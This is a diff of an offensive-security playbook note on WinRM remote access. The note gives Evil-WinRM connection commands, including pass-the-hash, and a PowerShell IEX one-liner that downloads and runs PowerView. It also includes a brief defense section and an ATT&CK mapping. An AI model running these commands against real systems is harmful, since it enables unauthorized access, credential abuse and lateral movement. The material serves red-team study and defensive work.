@@ -37,6 +37,8 @@ To use this procedure, the attacker needs to have valid credentials for the targ
 
 The business value of this procedure is that it allows an attacker to gain access to sensitive information on a remote machine without needing to physically access the machine. This can save time and resources for the attacker, while also allowing them to remain undetected.
 
+ 
+
 ## Requirements
 
 1. Valid credentials for the target machine
@@ -44,6 +46,8 @@ The business value of this procedure is that it allows an attacker to gain acces
 1. Access to the WinRM protocol on the target machine
 
 1. Tools to enable and establish a WinRM session (e.g. Evil-WinRM)
+
+ 
 
 ## Defense
 
@@ -53,6 +57,8 @@ The business value of this procedure is that it allows an attacker to gain acces
 
 1. Monitor network traffic for any suspicious activity related to WinRM
 
+ 
+
 ## Objectives
 
 1. Gain remote access to a target machine
@@ -61,13 +67,23 @@ The business value of this procedure is that it allows an attacker to gain acces
 
 1. Move laterally within a network
 
+ 
+
 # Instructions
 
 1. To enable WinRM on the system, run the 'winrm quickconfig' command in the command prompt. This command will configure WinRM to allow remote management and open the necessary firewall ports.
 
+ 
+
+
+
 **Code**: [[winrm quickconfig]]
 
+
+
 > WinRM (Windows Remote Management) is a protocol used for remote management of Windows systems. By default, WinRM is not enabled on Windows systems. The 'winrm quickconfig' command is used to quickly enable WinRM on the system. This command configures WinRM to allow remote management and opens the necessary firewall ports to allow remote access. Once WinRM is enabled, you can use it to remotely manage the system using tools like PowerShell or the Remote Server Administration Tools (RSAT).
+
+
 
 **Command** ([[Configure WinRM]]):
 
@@ -75,11 +91,21 @@ The business value of this procedure is that it allows an attacker to gain acces
 winrm quickconfig
 ```
 
+
+
 2. Use the `evil-winrm` command to interact with a remote Windows machine over WinRM. Specify the IP address, username, password, and other details of the remote machine using the available arguments.
+
+ 
+
+
 
 **Code**: [[evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXE]]
 
+
+
 > The `evil-winrm` command is a powerful tool that can be used to interact with a remote Windows machine over WinRM. It provides various arguments to specify the details of the remote machine, and can be used to execute commands, upload and download files, and perform other tasks on the remote machine. It is a useful tool for system administrators and security professionals who need to manage and secure Windows systems.
+
+
 
 **Command** ([[Connect to remote Windows machine using evil-winrm]]):
 
@@ -87,11 +113,19 @@ winrm quickconfig
 evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM]
 ```
 
+
+
+
+
 **Command** ([[Connect to remote machine using IP address and username]]):
 
 ```bash
 evil-winrm -i 10.0.0.20 -u username -H HASH
 ```
+
+
+
+
 
 **Command** ([[Connect to remote machine using IP address, username, password and realm]]):
 
@@ -99,11 +133,17 @@ evil-winrm -i 10.0.0.20 -u username -H HASH
 evil-winrm -i 10.0.0.20 -u username -p password -r domain.local
 ```
 
+
+
+
+
 **Command** ([[Download PowerView.ps1 script using IEX]]):
 
 ```bash
 IEX([Net.Webclient]::new().DownloadString("http://127.0.0.1/PowerView.ps1"))
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -127,3 +167,5 @@ IEX([Net.Webclient]::new().DownloadString("http://127.0.0.1/PowerView.ps1"))
 
 - [[Windows - Using credentials]]
 - [[WinRM Protocol]]
+
+
